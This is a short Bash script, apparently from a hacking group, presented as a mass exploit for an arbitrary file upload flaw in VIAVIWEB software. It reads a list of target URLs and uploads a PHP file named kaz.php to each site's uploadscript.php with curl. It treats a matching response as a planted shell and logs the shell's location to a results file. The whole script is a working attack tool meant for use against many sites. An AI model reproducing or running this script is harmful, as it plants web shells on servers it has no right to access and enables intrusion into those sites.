#!/bin/bash
# MantodKaz | D704T
# VIAVIWEB AFU mass exploit
echo -e "\e[1;36m"
echo "======================================================"
echo "     [Mass] VIAVIWEB Arbitrary File Upload            "
echo "                                                      "
echo "                                  D704T hengker team  "
echo "                         https://github.com/MantodKaz "
echo "======================================================"
echo -e "\e[0m"

echo -n "List URL : "
read -r TARGET_FILE
if [ ! -f "$TARGET_FILE" ]; then
  echo "File '$TARGET_FILE' tidak ditemukan."
  exit 1
fi
mapfile -t URLS < "$TARGET_FILE"
MP3_LOCAL_PATH="kaz.php"
for TARGET_URL in "${URLS[@]}"; do
  TARGET_URL=$(echo "${TARGET_URL}" | tr -d '[:space:]')
  TARGET_URL="${TARGET_URL}/uploadscript.php"
  RESPONSE=$(curl -s -X POST -F "mp3_local=@${MP3_LOCAL_PATH}" "${TARGET_URL}")
  if [[ "$RESPONSE" == *"kaz.php"* ]]; then
    echo -e "\e[32m[Vuln!!] ${TARGET_URL} yourShell -> (${RESPONSE})\e[0m"
    echo "${TARGET_URL}/uploads/${RESPONSE}" >> result.txt
  else
    echo -e "\e[31m[Not Vuln] ${TARGET_URL}\e[0m"
  fi
done
